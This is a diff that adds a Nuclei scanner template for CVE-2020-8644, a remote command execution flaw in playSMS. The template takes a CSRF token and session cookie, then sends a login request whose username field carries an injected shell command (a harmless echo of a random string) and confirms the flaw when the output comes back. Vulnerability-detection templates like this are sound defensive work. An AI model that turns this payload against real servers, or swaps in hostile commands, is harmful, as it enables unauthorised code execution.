@@ -1,0 +1,68 @@
+id: CVE-2020-8644
+
+info:
+  name: playSMS Remote Command Execution
+  description: |
+    PlaySMS prior to version 1.4.3 had an input validation error vulnerability due to the program failing to sanitize malicious strings, allowing arbitrary code execution.
+  severity: critical
+  tags: command-execution
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates/pull/4753/files
+  classification:
+    cve-id: CVE-2020-8644
+    cvss-score: 9.5
+  author: ProjectDiscoveryAI
+
+variables:
+  random_str: '{{rand_base(8,"abcdef0123456789")}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: csrf-token-extraction
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php?app=main&inc=core_auth&route=login'
+    headers:
+      User-Agent: Nuclei
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        regex:
+          - '<input type="hidden" name="X-CSRF-Token" value="(.*?)">'
+      - type: regex
+        name: phpsessid
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - 'PHPSESSID=([^;]+)'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "X-CSRF-Token"
+
+  - id: execute-command
+    method: POST
+    path:
+      - '{{BaseURL}}/index.php?app=main&inc=core_auth&route=login&op=login'
+    headers:
+      Origin: '{{BaseURL}}'
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: 'PHPSESSID={{phpsessid}}'
+    body: |
+      X-CSRF-Token={{csrf_token}}&username={{`echo ${random_str}`}}&password=
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '{{random_str}}'
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - 'echo'
